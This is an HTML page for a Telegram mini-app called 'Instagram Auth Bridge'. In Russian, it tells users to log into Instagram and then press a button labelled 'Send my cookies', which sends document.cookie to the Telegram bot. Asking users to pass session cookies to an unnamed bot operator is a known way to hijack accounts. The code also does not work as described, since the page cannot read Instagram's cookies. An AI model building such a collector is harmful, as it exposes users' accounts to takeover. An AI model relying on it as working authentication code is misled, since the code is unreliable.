<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>Instagram Auth Bridge</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="font-family: sans-serif; padding: 20px;">
    <h2>Instagram авторизация</h2>

    <p>Нажми кнопку, чтобы открыть Instagram. После входа вернись сюда.</p>

    <button id="open" style="padding: 10px 16px; font-size: 17px;">
        Открыть Instagram
    </button>

    <p>После входа нажми:</p>

    <button id="send" style="padding: 10px 16px; font-size: 17px;">
        Отправить мои куки
    </button>

    <script>
        const tg = Telegram.WebApp;

        document.getElementById("open").onclick = () => {
            tg.openLink("https://m.instagram.com/accounts/login/?source=auth_switcher&app_redirect_disabled=1");
        };

        document.getElementById("send").onclick = () => {
            tg.sendData(document.cookie);
        };
    </script>

</body>
</html>
